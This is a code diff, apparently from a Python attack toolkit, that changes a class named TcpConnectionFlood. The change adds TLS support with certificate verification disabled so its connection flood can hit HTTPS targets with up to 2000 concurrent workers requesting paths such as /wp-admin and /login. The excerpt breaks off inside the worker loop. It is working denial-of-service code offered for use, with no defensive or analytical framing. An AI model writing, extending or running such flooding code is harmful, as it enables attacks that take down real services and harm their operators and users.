@@ -46,23 +46,33 @@ class TcpConnectionFlood:
     async def attack(self, target: str, duration: int = 30, threads: int = 500, port: int = 0) -> Dict:
         self.sent = 0
         self.failed = 0
+        raw = target
         target = target.replace("https://", "").replace("http://", "").split("/")[0]
         try:
             ip = socket.gethostbyname(target.split(":")[0])
         except:
             return {"sent": 0, "failed": 0, "error": "resolve failed"}
         host = target.split(":")[0]
-        dst_ports = [p for p in ([port] if port else ([443, 80] if "https" in target or not port else [80, 443]))]
-        paths = ["/", f"/{random.randint(0,99999)}", "/wp-admin", "/admin", "/api", "/login", f"/?id={random.randint(0,999999)}"]
+        is_https = "https://" in raw or port == 443
+        dst_ports = [port] if port else ([443, 80])
+        paths = ["/", f"/{random.randint(0,99999)}", "/wp-admin", "/admin", "/login"]
+
+        ssl_ctx = None
+        if is_https:
+            import ssl
+            ssl_ctx = ssl.create_default_context()
+            ssl_ctx.check_hostname = False
+            ssl_ctx.verify_mode = ssl.CERT_NONE
 
         end = time.time() + duration
         max_workers = min(threads, 2000)
 
         async def _persistent_worker(wid: int):
             p = random.choice(dst_ports)
+            use_ssl = ssl_ctx and p in (443, 8443, 9443)
             while time.time() < end:
                 try:
-                    r, w = await asyncio.wait_for(asyncio.open_connection(ip, p), timeout=10)
+                    r, w = await asyncio.wait_for(asyncio.open_connection(ip, p, ssl=use_ssl), timeout=10)
                     req_count = 0
                     while time.time() < end and req_count < 500:
                         path = random.choice(paths)
